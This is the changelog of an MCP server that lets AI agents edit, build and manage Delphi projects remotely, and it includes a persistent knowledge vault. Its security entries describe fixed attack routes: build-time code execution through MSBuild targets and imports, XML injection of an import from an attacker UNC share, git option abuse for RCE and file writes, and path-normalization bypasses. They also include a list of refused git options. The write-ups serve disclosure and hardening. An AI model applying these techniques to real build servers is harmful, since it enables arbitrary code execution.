- **`DELPHI_MCP_VAULT_READONLY` only overrode the ini when set to `0`.** Setting
  it to `1` fell through to `settings.ini`, so a writable vault could not be
  forced back to read-only from the environment. The variable now wins in both
  directions.
- The test batteries defaulted to the **Debug** executable, which sits next to
  the operator's production `settings.ini` and so inherited its jail and vault.
  They now default to the **Release** build, which carries no configuration -
  the convention that was already in use, now the default so the batteries run
  with no arguments.

7 E2E batteries, **390 checks**.

## [0.26.1-beta] - 2026-08-20

### Security
- **The knowledge vault now belongs to the `vault_*` tools alone, wherever it
  sits.** Putting a vault *inside* a workspace root used to expose it to the
  code tools: `delphi_edit` could rewrite a note behind the vault's back -
  skipping the automatic backup and the protection of the governance files -
  and `delphi_list` served the notes as if they were source. Any path inside
  the vault is now refused by the code tools with a message pointing at
  `vault_read`/`vault_append`, and the vault is skipped in the `delphi_list`,
  `delphi_search` and `delphi_projects` walks. The isolation no longer depends
  on where the operator happens to put the folder.

7 E2E batteries, **390 checks**.

## [0.26.0-beta] - 2026-08-20

Field round 8 (Fable): the vault passed its security review untouched, but the
round broke the compile-only guard again and found the bootstrap unusable.

### Security
- **CRITICAL: the build guard was evadable through a macro-based `<Import>`.**
  0.25.1 trusted any import written with an MSBuild macro, but
  `$(MSBuildProjectDirectory)\payload.targets` is *both* macro-based and
  resolves right next to the project - so uploading a `.targets` there and
  importing it ran its `<Exec>` at build time. Confirmed end to end.
  Imports are now **followed and scanned recursively** (depth-capped): only the
  IDE's own targets are trusted without being read, anything else must resolve
  to a readable file that passes the same scan, and what cannot be resolved is
  refused. `<Target>`/`<Exec>` are also matched with an XML namespace prefix
  (`<msb:Target>` slipped past a literal match; MSBuild happened to reject it,
  which is not a guarantee to rely on). A traversal now disqualifies an import
  outright - `$(BDS)\..\..\evil.targets` was macro-based and ended in
  `.targets`, and the previous whitelist trusted it.

### Fixed
- **The vault bootstrap did not fit in one answer.** `vault_read` with no path
  returned rules + index whole - 85 KB against a real vault, past a client's
  per-result cap, forcing it to spill to disk and read the result back in
  pieces. Reads are now **paged by line** with a per-result budget, and every
  truncated answer states the exact continuation offset
  (`Mostradas las lineas 1..271 de 379. Pide el resto con {offset: 272}`).
  Verified against the real vault: 40 KB first page, continuation works.
- **A rejected path came back rewritten.** Asking for `C:/Windows/win.ini` was
  refused with `"srvc:/Windows/win.ini"` - the outbound drive filter rewriting
  an echo of the caller's own text, confusing to debug. The rejection no longer
  echoes the path; it states the rule.

7 E2E batteries, **383 checks**.

## [0.25.1-beta] - 2026-08-20

### Security
- **Hardened the compile-only scan against evasions** (found while writing the
  next field-test brief, before it shipped). The 0.24.0 guard matched element
  names case-sensitively and let an `<Import>` name any relative file, so three
  routes remained: odd casing (`<prebuildevent>`), and — the real one — a
  *clean-looking* `.dproj` importing an evil `.targets` dropped beside it, which
  moved the payload one file away from the scan. The whole scan is now
  case-insensitive, and an `<Import>` is refused unless it is macro-based
  (`$(BDS)\...`, as every real project's imports are): no UNC, no absolute, no
  `..`, no bare relative file. Verified: 7 evasion variants refused, and an
  untouched project still builds.

## [0.25.0-beta] - 2026-08-19

### Added
- **Knowledge vault: persistent memory for agents (optional, off by default).**
  Point `[Vault] Path` at a folder of Markdown notes (an Obsidian vault) and the
  server exposes it, so an agent working remotely can consult accumulated
  knowledge — decisions, conventions, project context — and not just source
  code. Nothing registers unless configured.
  - `vault_read` — a note by relative path, with line numbers and
    `offset`/`limit`. **With no path it returns the vault's own rules
    (`AGENTS-VAULT.md`) plus its index (`MEMORY.md`)**: the bootstrap, because
    those filenames are a vault convention a remote agent should not have to
    know. Lazy loading is the protocol — the vault is never read in bulk.
  - `vault_search` — `target=files` (glob over note names) or `target=content`
    (regex inside notes → path, line number, line), optionally scoped to a
    `subfolder`.
  - **Writing (opt-in, `[Vault] ReadOnly=0`, read-write credential only):**
    `vault_append` (a dated log entry or progress line, optionally after a
    unique `anchor`), `vault_create` (new note, **never** overwrites) and
    `vault_patch` (replace a fragment that appears exactly once). There is
    deliberately no wholesale rewrite, no delete, no move and no git.
  - **The rules that can be enforced by code are enforced by the server:** the
    original of any modified note is copied to `backups/mcp/<timestamp>/` first
    (no parameter disables it); the governance files (`AGENTS-VAULT.md`,
    `AGENTS-VAULT-WRITE.md`, `MEMORY.md`) are never writable; a strict jail
    (relative paths only, no `..`, `.md` only, `backups/`/`.git/`/`.obsidian/`
    excluded); UTF-8 in and UTF-8 without BOM out; and notes over 100 000
    characters are truncated with a pointer to `offset`/`limit`.
  - The *doctrine* stays in the vault itself, not in the code — so two people
    can point this at two different vaults and each gets their own rules.
    See **docs/VAULT.md**, which also shows how to start a vault from scratch.

  - **Session wiring, so no agent has to be taught any of this:** when a vault
    is configured the MCP `initialize` response carries `instructions` (there
    is a vault, start with `vault_read` and no path — short on purpose, since
    instructions ride in every prompt), and a `vault` prompt is exposed, which
    clients surface as an invocable command (`/vault` in Claude Code) to reload
    rules + index mid-session. A vault can replace that text with its own by
    placing `VAULT-INSTRUCTIONS.md` at its root — its "skill".
  - **First run seeds itself:** point `[Vault] Path` at a folder that does not
    exist or holds no notes and the server creates a working starter vault
    there (rules, index, write guide, example project). A vault that already
    has notes is never touched. The same starter kit ships in
    `examples/vault/` — generic on purpose: the shape, not anyone's content.
  - The vault is an **independent jail**: it lives outside the workspace roots,
    the code tools cannot read it and the vault tools cannot serve code.
  - Vault text is exempt from drive-letter masking, like `delphi_read`: an
    agent copies fragments of a note verbatim to build the `anchor`/`old_text`
    of a later write, so the text must match the file on disk byte for byte.

7 E2E batteries, **371 checks** (the vault battery adds 83).

## [0.24.0-beta] - 2026-08-19

Field round 7 (Fable): the sandbox held again, but the round found the real
hole — the "compile-only, never execute" posture had a build-time escape.

### Security
- **CRITICAL: code execution via `delphi_upload` + `delphi_build`.** `delphi_upload`
  writes any path with no extension filter, so a `.dproj` could be planted whose
  MSBuild `<Target><Exec>` ran an arbitrary shell command on the next
  `delphi_build` — at normal integrity, defeating "this server only compiles".
  The narrow, documented pre/post-build vector turned out to be trivial to reach.
  Fixed at the point of execution: before running MSBuild, the project is scanned
  and a build that would **execute a shell** — a custom `<Target>`/`<Exec>`, a
  non-empty Pre/PostBuild/Link event, or an `<Import>` of a foreign (UNC or
  absolute non-macro) targets file — is **refused**, unless the operator opted
  into execution with `[Security] AllowRun=1` (the same switch that gates
  `delphi_run`). The scan holds however the `.dproj` arrived (upload, edit, or
  pre-existing). A stock RAD Studio project has none of these and builds normally.
- **HIGH: `delphi_upload` overwrote with no undo.** A fresh upload (offset 0)
  truncates the target; it was the only writer that could destroy a file with no
  backup (a 1-byte upload wiped a real `.dproj` in testing). Upload now copies
  the existing file to the recoverable trash (`__delphi-patch`) before truncating.

6 E2E batteries, **280 checks** (adds the upload+build exploit, now blocked, and
the upload backup).

## [0.23.0-beta] - 2026-08-19

Field round 6 (Fable): the filesystem sandbox held against every attack; the
three findings left are behaviour/UX papercuts, none a security hole.

### Fixed
- **R6-A: `delphi_config view` reported the wrong enabled/disabled per platform.**
  The `.dproj` platform list was parsed with a separate attribute list (`value`)
  and value list (inner text); the file's `<Platform Condition="…">Win64</Platform>`
  selector — inner text but no `value` — shifted the value list by one, so every
  platform's `enabled` flag was mislabelled. Each `<Platform value="X">V</Platform>`
  is now parsed as a unit, so name and enabled always come from the same element.
- **R6-C: a low-integrity `delphi_run` could not overwrite a pre-existing file**
  in its own working folder (a log/csv/ini created earlier at Medium integrity)
  — an unexplained "Acceso denegado". The inherited Low label only reached new
  children; existing entries are now relabelled too, so the confined run can
  update its own outputs and nothing else. (Only reachable with `AllowRun=1`.)

### Added
- **R6-B: `delphi_list includeTrash=true`** surfaces the recoverable trash
  (`__delphi-patch`, where `delphi_delete` moves files) so a deleted file can be
  found and restored with `delphi_move`. Hidden by default, as before.

6 E2E batteries, **276 checks**.

## [0.22.0-beta] - 2026-08-19

### Added
- **`delphi_config set-output`: put every binary under one folder.** A curated
  edit of the `.dproj` (same pipeline as `add-platform`: shared `Lsp.Dproj`
  read, encoding-preserving write, automatic `__delphi-patch` backup) that sets
  `DCC_ExeOutput` to `.\<folder>\$(Platform)\$(Config)` and `DCC_DcuOutput` to
  `.\<folder>\Dcu\$(Platform)\$(Config)` — the common RAD Studio convention,
  keeping the per-platform/config subfolders so Win32 and Win64 never collide.
  Default folder `Compiled`; `output=default` restores the stock layout. The
  folder name is validated (simple relative token only — no XML metacharacters,
  no absolute path, no `..`), so it cannot inject into the project the way the
  0.19.0 platform name could. A write op: refused for read-only credentials.
  Verified end-to-end: after `set-output Compiled`, a real build lands its
  `.exe` in `Compiled\Win64\Debug\`. 6 batteries, **271 checks**.

## [0.21.0-beta] - 2026-08-19

This release settles the server's posture: it is a **pure development/compile
server**. It compiles; it does not execute. Testing a binary belongs on the
client's own machine (or a real target device), not on the build box.

### Changed
- **`delphi_run` is now OFF by default.** Executing a compiled program on the
  build server is both pointless (nobody sees the process there) and the main
  way a runaway agent could do damage, so it is refused for **every**
  credential — read-write tokens included — enforced in the single entry gate.
  The rejection points the agent at the intended path instead: download the
  artifact (`delphi_package` + `delphi_fetch`) and run it on your machine, or
  deploy to a real target (PAServer on Linux/macOS, or Android) where it runs
  on the client, not the server. An operator who genuinely needs server-side
  execution (e.g. a console test runner in CI) can opt in with `[Security]
  AllowRun=1` (env `DELPHI_MCP_ALLOW_RUN=1`); the low-integrity sandbox and Job
  Object still apply in that case.

### Added
- **Startup log now announces the workspace jail (roots).** The single most
  important operational fact — what the agents can and cannot touch on disk —
  was absent from the banner. It now prints `Workspace jail (roots, N): …`, or
  a warning when there is no jail (unrestricted) or the roots are invalid
  (fail-closed). Same summary in the console and tray hosts.
- **`docs/AGENT.md`** — a model-facing guide (prefer semantic tools over text
  search, virtual paths, 0-based positions, safe editing, recoverable trash)
  to paste into an agent's `CLAUDE.md` / `AGENTS.md`.

6 E2E batteries, **264 checks** (adds a check that `delphi_run` is refused by
default). See below for the 0.20.0 sandbox this builds on.

## [0.20.0-beta] - 2026-08-19

### Security
- **Real filesystem sandbox for `delphi_run` (closes the B0b write vector).**
  A program launched by `delphi_run` now runs at **Low integrity** (Windows
  Mandatory Integrity Control), so it **cannot write** to any object at the
  normal (Medium) integrity level — the user profile, other projects,
  `C:\Windows`, anywhere on the system. Its own working directory is labelled
  Low so it can still write its output there, and there only. Reads are
  unaffected (read-down is allowed) and stdout is still captured. The response
  states `sandbox=low-integrity`; if the OS ever refuses the confined launch
  it says `sandbox=NO` instead of pretending. Verified: a compiled program
  that tries to write to `C:\Users\Public` is blocked while its local write
  succeeds. This plus the 0.17.0 Job Object (lifetime/resources) sandboxes
  run along both axes.
  *Scope: `delphi_run` only. `delphi_build` still runs the trusted toolchain
  at normal integrity (it must write .dcu/.exe and read the SDK/registry); a
  malicious `.dproj` pre/post-build step remains a narrower, documented
  vector.*

## [0.19.0-beta] - 2026-08-19

Field round 5 (Fable): one critical injection and two recovery gaps.

### Security
- **R5-B (critical): XML injection through `delphi_config add-platform`.** The
  platform name was interpolated raw into `<Platform value="…">` in the
  `.dproj`, with no validation or escaping. A crafted name closed the tag and
  injected a live `<Import Project="\\attacker\share\x.targets"/>` — which
  MSBuild would execute on the next `delphi_build` (build-time RCE). The name
  is now validated against the canonical platform whitelist (Win32, Win64,
  Win64x, WinARM64EC, OSX64, OSXARM64, Linux64, Android(64), iOS…); anything
  else is refused, so no metacharacter can reach the file. It really is a
  curated edit now.

### Added
- **`delphi_config remove-platform`**: the reversible inverse of
  add-platform (disables a platform), backing the `.dproj` up first — the
  symmetry that was missing for recovery.

### Fixed
- **R5-A: the trash was unrecoverable by the route its own message named.**
  `delphi_delete` said "recover with `delphi_move` from that path", but
  `delphi_move` refused any path under the trash. Restoring an item OUT of the
  trash is now allowed (moving the trash folder itself, or moving items INTO
  it by hand, stays refused), and the delete message spells out the exact
  call.
- **R5-C: `.dproj` edits now leave a backup.** `add-platform`/`remove-platform`
  write through the same backup-first path as `delphi_edit`, so a bad edit is
  recoverable from `__delphi-patch\`.

## [0.18.0-beta] - 2026-08-19

Four issues from an external code review, all fixed and regression-tested.

### Security
- **No-credential server binds to localhost only.** With NO token and no
  `AnonymousReadOnly`, the HTTP host would listen on every interface — an
  unconfigured server silently open to the network. It now binds `127.0.0.1`
  only in that case; remote access requires a token (or an explicit
  `AnonymousReadOnly=1`).
- **More git options refused at the gate.** `--config` is `-c`'s long form on
  `clone` and slipped through (`git clone --config core.sshCommand=… ` →
  RCE); also `--separate-git-dir`, `--template`, `--git-dir` and `--work-tree`
  redirect where git writes/reads and could escape the jail. All now refused
  alongside the existing `-c`/`--output`/`--no-index` set.

### Fixed
- **Build/run no longer hangs on a silent process.** The output pipe was
  drained with a blocking `ReadFile`, so a child that produced no output
  blocked forever and the timeout never fired. It now polls with
  `PeekNamedPipe`, honouring the deadline even on a silent hang (verified: a
  mute 60 s process with a 3 s timeout returns in ~3 s).
- **The tray app now registers all 27 tools.** Five units added in 0.15–0.16
  (`delphi_config`, `delphi_paserver`, `delphi_delete`, `delphi_move`,
  `delphi_report`) were linked into the console host but not the tray, so the
  tray silently exposed fewer tools. Both host unit-lists are now kept in
  sync (with a comment on each to keep it that way).

### Docs
- README no longer claims a Windows Service, LRU eviction or idle-shutdown as
  shipped — they are marked roadmap. What runs today (console + tray, warm
  DelphiLSP per workspace) is described as it is.

## [0.17.0-beta] - 2026-08-19

### Security
- **Build/run processes are confined in a Windows Job Object** (B0b): the
  whole spawned tree (cmd → msbuild → dcc, or a launched exe) is now
  **killed on job close**, so a timeout or the server shutting down never
  leaves orphaned compiler/child processes behind; a process-count cap guards
  against fork bombs and a per-process memory cap against runaways; UI
  restrictions block the tree from exiting Windows or changing system
  settings. Applied at the single process-launch point, so it covers build,
  run and git. **Honest scope**: this bounds process lifetime and resources,
  not filesystem access — a compiled program can still write where the
  service account can. Full per-directory confinement (AppContainer / a
  restricted token) remains future work; the workspace jail plus this Job
  Object bound the damage.

## [0.16.0-beta] - 2026-08-19

### Added
- **`delphi_delete` (tool 26)**: remove a file or folder inside the workspace
  — NOT a hard delete: the target is moved to a recoverable trash
  (`__delphi-patch\<date>\deleted\` next to it), so a mistake can be undone.
  Refuses to delete the trash folder itself. Jailed, read-write only. Cleans
  up stray files and build leftovers.
- **`delphi_move` (tool 27)**: move or rename a file/folder inside the
  workspace; the source is copied to the trash first, destination parents are
  created, an existing destination is never overwritten. Jailed, read-write.
- **`[Server] BindIP`** (env `DELPHI_MCP_BIND_IP`): bind the HTTP listener to
  one interface (e.g. a LAN/VPN address) instead of all interfaces — which
  also removes the duplicate IPv4+IPv6 firewall prompt.

## [0.15.0-beta] - 2026-08-19

Cross-platform groundwork: see and manage a project's build configurations,
and discover the Platform Assistant so an agent can target Linux/macOS.

### Added
- **`delphi_config` (tool 24)**: see and manage a project's build
  configurations and target platforms. `view` (read-only) reports the
  framework, the configurations (Debug/Release/custom) and every platform
  with whether it is enabled, whether the project **can** target it, and
  whether it needs a remote profile. `add-platform` (read-write) enables a
  platform in the `.dproj` — a **curated** edit of the `<Platforms>` block
  only. It refuses a platform the framework cannot target: **VCL is Windows
  only** (`Vcl.Forms` does not exist on Linux/macOS/mobile); FMX and console
  cross platforms.
- **`delphi_paserver` (tool 25, read-only)**: the bridge for building on
  other platforms via the Platform Assistant. `platforms` lists what this
  server can target and each platform's profile/SDK status; `packages` lists
  the PAServer installers that ship with each Delphi install (download with
  `delphi_fetch`, run on the Linux/Mac target); `profiles` lists the
  registered connection profiles and SDKs. The write/network half (create a
  profile against the target, deploy+run remotely) builds on this once a live
  PAServer target exists.
- **`Lsp.Dproj`**: the single tolerant `.dproj` parser, now shared by the LSP
  config fabricator and these tools — no second parser (house rule).
- `delphi_build` accepts any declared platform, not just Win32/Win64.

## [0.14.0-beta] - 2026-08-19

The library read zone finally covers what it always promised, plus the
fourth field round's findings.

### Fixed
- **The read zone was missing most of the machine's Delphi material**, a gap
  in a feature shipped back in 0.6.0:
  - it walked only `Win32`/`Win64`, while an install registers a Library
    Search Path for **every** platform (13 here: Linux64, OSX64, OSXARM64,
    Android ×2, iOS ×4, Win64x, WinARM64EC…);
  - it expanded a hardcoded handful of macros, so every entry using
    `$(BDSCatalogRepository…)` was silently dropped — i.e. **every GetIt
    package** (FmxLinux, LockBox…) and the Android SDKs.
  Macros are now expanded against the IDE's own authoritative table
  (`HKCU\…\BDS\<ver>\Environment Variables`), all registered platforms are
  walked, the catalog repositories are included whole (the search path points
  at compiled `Lib\`, while the useful material is the sibling `source\`),
  and it is done **per installation** — each Delphi owns its packages.
- **`delphi_list` aborted entirely on one unreadable subdirectory**
  (`TDirectory.GetFiles` recursive is all-or-nothing) and again when asking
  size/date of a file whose path exceeds the classic length limit. Measured
  on the Android NDK, which killed a whole listing; it now walks tolerantly
  and lists 19,436 files there.
- **R4-A**: `delphi_fetch` returned the server's real path. The byte-fidelity
  exemption was wrong for it: its payload is base64, an alphabet with neither
  `:` nor `%`, so masking cannot corrupt it. Only `delphi_read` stays exempt
  (its payload is file text an edit anchor must match).
- **R4-C**: `delphi_list` echoed `..\` segments back in every returned path;
  the root is canonicalized first.
- Paths whose last segment is `.` or `..` are no longer refused as
  "name ending in a dot": they are ordinary navigation, and the jail already
  canonicalizes before deciding (escape attempts through `..` remain caught —
  verified in the field round).

### Added
- **R4-B**: `delphi_workspace` publishes `readableExtra` — the read-only
  library zone (installations, library paths, catalog repositories), so the
  agent knows what it may read besides the roots instead of being told
  "anything outside is refused".

## [0.13.0-beta] - 2026-08-19

Read-only becomes airtight, a feedback channel for the agents that use the
server, and the third field round's findings.

### Added
- **`delphi_report` (tool 23)**: agents report bugs, limitations or
  suggestions **directly to the server**, which stores each one as its own
  timestamped markdown file (version, date, kind, origin, message) in a
  `reports/` folder next to the executable — a history that can be read and
  worked through later. Deliberately **available at every access level,
  read-only included**: the restricted agents are the ones most likely to hit
  a wall. Safe by construction — the client never supplies a path: the folder
  is fixed and the file name is generated server-side.
- **`Lsp.Texts`**: every model-facing text (tool/parameter descriptions,
  rejections, notices) and the version string now live in ONE unit. These
  texts are the server's real user interface; scattered they drift and
  contradict each other. Pure ASCII by convention — the encoding rule that
  produced the mojibake bug is now a property of the file.

### Security
- **Read-only is now airtight** (found by an internal audit that ran the
  server anonymously and tried to escape):
  - `delphi_git diff|show --output=<path>` let ANY client — including
    anonymous/read-only — write files anywhere on disk, **outside the
    workspace roots included** (an absolute `--output` ignores `-C <repo>`).
    Dangerous git options (`--output`, `--no-index`, `--exec`,
    `--upload-pack`, `--receive-pack`, `--ext-diff`, `--textconv`,
    `--config-env`, `-c`, `-o`) are now refused **at the single gate**, so the
    rule applies to every git call at BOTH access levels.
  - `delphi_git tag` with a `message` (annotated tag = a write) passed the
    read-only gate when `args` was empty: the gate only looked at `args`.
- Verified in the same audit and left unchanged (they were already correct):
  401 for a missing token when one is configured, and the per-request
  read-only flag being re-set on every request (no leakage between pooled
  Indy threads).

### Fixed
- **C1-bis**: `insert:"metodo"` with `visibility:"published"` placed the
  declaration right after the class header — i.e. BEFORE the component
  fields, which is E2169 ("field definition not allowed after methods").
  It now lands after the last member of the implicit published section.
- **B5** (root cause found by measuring the live JSON): `definition` answers a
  bare Location **object**, not an array, so the chaining added in 0.12.0
  never triggered and `kind=declaration` still returned the enclosing scope.
  The parser now accepts object/array/LocationLink and aims the second lookup
  at the routine's identifier column.
- **R3-1**: LSP tools leaked the real drive in their URIs
  (`file:///D%3A/...`) because the percent-encoded colon dodged the mask.
  Virtual drive units now cover that form too.
- `delphi_git log` regression test no longer asserts on a specific old commit
  message (it scrolled out of the 20-line window).

## [0.12.0-beta] - 2026-08-19

Virtual drive units — server paths stop looking like the client's own disks —
plus every finding from the second field round (the "Agenda" end-to-end run:
2 projects, 7 commits, 16/16 tests, ~86 MCP calls).

### Added
- **Virtual drive units (`srvd:`, `srvc:`, ...)**: the server's real drive
  letters never travel to the client. One generic prefix rule at the single
  dispatch gate handles both directions — arguments are expanded on the way
  in (`srvd:\x` → `D:\x`; real paths still accepted), and every textual
  result is masked on the way out, INCLUDING compiler/git/LSP output and 8.3
  short forms (`D:\PROYEC~1`). Byte-fidelity exemption: successful
  `delphi_read`/`delphi_fetch` content travels verbatim (an edit anchor
  built from masked text would not match the disk); their rejections are
  masked like everything else. Measured origin: remote agents mistaking
  server paths for their own local disks.
- **`delphi_edit delete:true`**: removes the anchored line ENTIRELY
  (`new:""` only blanks it — and now says so: `BLANQUEADA la linea N ...
  para eliminarla del todo usa delete:true`).
- **IDE settings read at runtime** (`IdeConfigValue`, generic HKCU reader —
  the building block for future Android/macOS/SDK configuration): new
  units/forms/projects are created with the encoding the IDE is configured
  to use (`Editor\DefaultFileFilter`: UTF-8 → utf8-bom, ANSI → cp1252), and
  BOM-less pure-ASCII files get their first accents written in that same
  standard.

### Fixed
- **B3 (blocker): `insert:"rutina-global"` in a `.dpr`** placed the routine
  before `end.` — legal in a unit, E2070 + 2×E2029 in a program. In a `.dpr`
  the routine now lands between the `uses` clause and the main `begin`;
  `insert:"metodo"` on a `.dpr` is refused with guidance.
- **C1: `insert:"metodo"` with `visibility:"published"`** now works on form
  classes with no explicit section keyword: the declaration lands in the
  implicit published section right after the class header — the event
  handler case, the most common VCL edit.
- **B1: `delphi_git commit`/`tag` messages** now reach git via `-F <file>`
  (byte-exact): embedding them in the command line turned every `"` into
  `''`.
- **B5: `delphi_definition kind=declaration` on a call site** returned the
  declaration of the ENCLOSING method; the tool now chains
  definition→declaration at the target's own position, so it answers the
  callee.
- **B2: `acentos=` counted the UTF-8 BOM** as 3 phantom high bytes.
- **B4: mojibake in `delphi_create form-vcl` response messages**: a handful
  of message literals carried non-ASCII bytes that the compiler mangles when
  the IDE's default encoding disagrees with the file; all server messages
  are now pure ASCII by construction.
- Scaffolded `.gitignore` no longer carries a UTF-8 BOM (git does not strip
  it, which silently broke the first ignore rule).

### Security
- **`[Workspace] Roots` parsing fails CLOSED**: quotes around a root are
  tolerated and stripped (paths with spaces need no quoting — the separator
  is `;`), and if Roots is configured but NO root parses valid, every path
  is refused instead of silently running unrestricted.

## [0.11.0-beta] - 2026-08-19

The transfer batch, plus the addendum findings from the replication run.
Bringing a repository in no longer means recreating it file by file.

### Added
- **`delphi_git clone` / `pull` / `fetch`**: a whole repository onto the
  server in ONE call, jailed to the workspace roots (URL in `message`,
  destination in `repo`; only http/https/git/ssh URLs; refuses to clone
  over an existing repo). Measured: the full public repo cloned in 1.2 s
  versus ~200 MCP calls to recreate it.
- **`delphi_upload` (tool 22)**: the mirror of `delphi_fetch` — chunked
  base64 upload with whole-file SHA-256 verification, for material that
  cannot be recreated by editing (`.res`, icons, binary designer files).
  Jailed, creates parent directories, refuses out-of-order offsets.
- **Create-with-content**: `delphi_edit createunit` accepts `content` (the
  whole unit in one call instead of create + N anchored patches — the
  measured friction #1: 6 calls per file down to 1), both it and
  `delphi_textedit` accept `eol` (`crlf` default / `lf`), because the JSON
  channel usually delivers LF-only text.

### Security
- **Windows name-normalization bypass closed** (found in the field): a path
  ending in a dot or space ("X.pas.") passes any literal extension check
  while Windows creates "X.pas" — it defeated the `.pas` guard of
  `delphi_textedit`. Alternate Data Streams ("X.pas::$DATA") did the same.
  Both are now refused at the single write gate, so the fix covers EVERY
  writing tool, not just the one where it was found.
- `delphi_upload` validates the base64 alphabet itself: Delphi's decoder
  skips invalid characters instead of failing, which would have written a
  silently corrupt file.

### Fixed
- `delphi_textedit` create reported `encoding=utf8` for pure-ASCII content
  that a later `delphi_read` detects as cp1252; it now says what detection
  will say.

## [0.10.0-beta] - 2026-08-19

More field-test findings from the full-repo replication run. Two were real
bugs (one an outright blocker), one a new tool, one a security hardening.

### Fixed
- **Dotted unit names** (blocker): `delphi_edit createunit` and scaffolded
  form units rejected names like `Lsp.BuildRunner` — the tool could not
  create the very units of the project it is part of. Namespaced names
  (`Ident(.Ident)*`) are now accepted.
- **Access Violation on `delphi_edit` with `new=""`**: blanking a line
  crashed the handler (indexing an empty split). Empty replacement now
  blanks the line cleanly.

### Added
- **`delphi_workspace` (tool 21)**: the server's lay of the land — the
  configured workspace roots (made explicit so a remote agent never
  confuses SERVER paths with its own local disk), the access level
  (read-write / read-only) and the active Delphi. Read-only; call it first.

### Security
- Every `delphi_run` (arbitrary execution by design) and `delphi_build`
  (can run pre/post-build steps from the .dproj) now writes an audit line
  to the log — for run, the executed binary's SHA-256. (Build and run
  remain refused under a read-only credential.) OS-level sandboxing of the
  spawned process is tracked as future work.

## [0.9.1-beta] - 2026-08-19

### Fixed
- **Mojibake in delphi_git output** (second field-test round): git emits
  UTF-8 but captured console output was decoded as ANSI ("AÃ±ade" for
  "Añade"). The capture now runs a strict UTF-8 scan over the bytes:
  well-formed UTF-8 with high bytes decodes as UTF-8, everything else keeps
  the ANSI fallback (compilers and console programs emit ANSI/OEM). Applies
  to delphi_git, delphi_run and delphi_build alike. 142 checks.

## [0.9.0-beta] - 2026-08-19

Everything in this release comes from the first real remote field test: a
Claude Desktop agent on another machine drove the full cycle over HTTP and
its report exposed four issues. All four are fixed and test-locked.

### Fixed
- **Stale LSP buffer** (the big one): the language server saw each file as
  it was when first opened; edits made afterwards (delphi_edit, scaffolding,
  external editors) were invisible to completion/signature/definition. Now
  every acquire compares a disk fingerprint (mtime+size) and refreshes the
  buffer via didChange - the LSP always answers about the CURRENT source.
- **BOM false positive in the delphi_edit audit**: on UTF-8+BOM files the
  high-byte accounting smuggled 3 phantom bytes (the BOM) into the "leaving"
  side, producing "ACENTOS FUERA DE CUADRO: esperaba 0 y hay 3" on perfectly
  healthy writes (and scaring agents into restoring). Text fragments are now
  encoded BOM-less for accounting.

### Changed
- **delphi_git `message`**: normal punctuation is welcome (the message never
  goes through a shell - git is spawned with a direct command line); only
  line breaks are refused. Shell-metacharacter screening stays on `args`.
- **delphi_git `config`** added to the whitelist, restricted to `user.name`
  / `user.email` (value in `message`), so a remote agent can commit on a
  fresh repo/machine. Refused in read-only mode like every write.
- **delphi_create** ships a basic `.gitignore` with every new project
  (build artifacts, tool backups, `.delphilsp.json`); the agent may edit it
  later with delphi_textedit.

### Tests
- 141 checks across the 5 batteries (stale-buffer refresh, BOM accounting
  on utf8-bom, git config identity + free punctuation, scaffold .gitignore).

## [0.8.0-beta] - 2026-08-19

Closes the gap found by the full capability inventory of DelphiLSP 37.0
(docs/DELPHILSP-NOTES.md): the engine announced signatureHelp and
declaration/implementation providers that no tool exposed.

### Added
- **`delphi_signature` (tool 20)**: signature help for the call under a
  position — routine signatures with parameter names/types, the IDE's
  Ctrl+Shift+Space. Position must be inside the call parentheses.
- **`delphi_definition` `kind` parameter**: `definition` (default) = the
  body in the implementation section; `declaration` = the interface
  declaration — the two halves of a Delphi unit. (`implementation` is
  accepted but the engine answers it like declaration — measured.)

### Docs
- DELPHILSP-NOTES: measured navigation semantics (definition=body,
  declaration=interface, implementation≡declaration), LSIF conditions and
  kill-switch, `$Y` requirement, DelphiLSPLog registry logging.

## [0.7.0-beta] - 2026-08-19

### Added
- **`delphi_installs` (tool 19)**: list every RAD Studio/Delphi installation
  discovered on the machine (side-by-side versions are common), with root
  directory, DelphiLSP/msbuild availability, and which one is ACTIVE for the
  LSP engine (the newest shipping DelphiLSP.exe). Installs without DelphiLSP
  are listed too: they still build via msbuild.

### Fixed
- **No composed branding paths**: `$(BDSUSERDIR)`/`$(BDSCOMMONDIR)` are now
  resolved from the authoritative `rsvars.bat` written by the installer
  (Embarcadero renames its Documents folder between eras — e.g. "RAD
  Studio" vs "Embarcadero\Studio"), never composed by hand. Entries that
  cannot be resolved are dropped instead of guessed.

## [0.6.0-beta] - 2026-08-19

Born from a dogfooding audit: "could this MCP have built its own project?"
The Delphi cycle could; docs, tests and release engineering could not. Now
they can.

### Added
- **`delphi_textedit` (tool 18)**: safe editing of plain-text NON-Delphi
  files (.md .html .js .css .sql .py .bat .ini .json ... any plain text,
  denylist not whitelist) with the same discipline as `delphi_edit` —
  one-full-line unique anchor with hints and atline tie-break, encoding and
  EOL preserved, automatic backup, atomic write, no whole-file rewrites —
  plus a CREATE mode that never overwrites. Delphi sources/designers/.dproj
  and binaries are refused.
- **`delphi_git`: `init`, `push`, `tag`** added to the whitelist (push uses
  the credentials/remotes stored on the server — consistent with the
  centralized model; tag is annotated when "message" is given). In read-only
  mode `tag`/`branch` without arguments (pure listing) pass; everything else
  that writes stays refused.
- **Library read zone**: with a jail configured, READING tools (read /
  search / list / fetch / LSP navigation) also accept the RAD Studio
  installation and the IDE Library Search Path directories, so agents can
  follow definitions into RTL/VCL sources and read installed components'
  code. Writing tools can never touch that zone.
- **Config Fabricator**: merges the IDE's global Library Search Path
  (registry) into fabricated settings, so symbols of installed third-party
  components resolve without the project repeating their paths.

### Tests
- 124 checks across the same five batteries (textedit lifecycle including
  .html, git init/tag/push against a throwaway repo, library-zone
  read-vs-write, read-only classification of the new tools).

## [0.5.0-beta] - 2026-08-19

### Added
- **Read-only access level**, enforced at a single gate in front of every
  `tools/call`: `[Security] ReadOnlyToken` (second Bearer credential),
  `AnonymousReadOnly=1` (tokenless requests get read-only), and a
  `--readonly` flag (whole process read-only, any transport). Read-only
  clients can read, search, navigate symbols, get diagnostics, download and
  run query git commands; `delphi_edit`, `delphi_create`, `delphi_build`,
  `delphi_run`, `delphi_package` and git write commands are refused. Made
  for reviewer agents (e.g. a wiki agent cross-checking the sources).
- `settings.example.ini` configuration template.

### Changed
- Documented that the HTTP listen port is configurable via
  `settings.ini [Server] Port` (default 3000; `--http <port>` overrides),
  and locked the behavior with a test.
- Token/credential reading centralized in one unit (was duplicated in the
  console and tray hosts).

## [0.4.0-beta] - 2026-08-19

The project is now explicitly labeled **beta**: functional and test-covered,
but young — expect rough edges and breaking changes between minor versions.

